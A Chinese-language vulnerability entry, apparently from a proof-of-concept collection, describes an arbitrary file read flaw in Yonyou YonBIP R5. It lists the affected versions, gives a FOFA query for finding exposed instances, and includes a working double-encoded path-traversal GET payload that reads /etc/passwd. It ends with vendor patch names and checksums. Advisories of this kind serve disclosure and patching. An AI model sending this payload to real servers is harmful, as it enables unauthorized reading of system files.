用友YonBIP R5旗舰版 yonbiplogin 任意文件读取漏洞

漏洞描述：用友YonBIP R5旗舰版 是用友网络科技股份有限公司推出的一款企业级管理软件，属于其企业级信息化解决方案的一部分，广泛应用于大中型企业的资源管理、数据分析和业务流程自动化等领域。

影响范围：YonBIP V3.0(R5_2312)、YonBIP V3.0(R5_2312_SP240517)

FOFA：title="数字化工作台" || title="YonBIP"

Payload：GET /iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.jpg.js HTTP/1.1

![用友YonBIP R5旗舰版 yonbiplogin 任意文件读取漏洞](https://github.com/capable-Hub/POC/blob/main/images/b9iwwurioaaic8iy.png)

修复建议：

基于专属化盘版本号进行排查，补丁请至“云产品补丁中心”中下载。

YonBIP V3.0(R5_2312_SP240517);

补丁名称：TNS_iuap-fe-webhome_iuap.V6.R5_2312_SP240517_36_QP20240927-2

校验码：dbe6149dab9dce75e81717d7a343861cfd81306b

依赖补丁：TNS_iuap.V6.R5_2312_36_SP20240605-2


YonBIP V3.0(R5_2312)：

补丁名称：TNS_iuap-fe-webhome_iuap.V6.R5_2312_36_QP20241021-2

校验码：a35e4160d7b7aab7e68fc9cd0cc36e5c05011058


YonBIP V3.0(R5_2312)：R5 standalone版本补丁

补丁名称：TNS_iuap-fe-webhome_iuap.V6.R5_2312_37_QP20241024-1

校验码：8ee58fbaac546a8278924579ba0e38e339a418c0


备注：

1025（包含）以上版本合集补丁包含该安全补丁

参考链接：YonBIP R5旗舰版任意文件读取安全风险通告：https://security.yonyou.com/#/noticeInfo?id=627
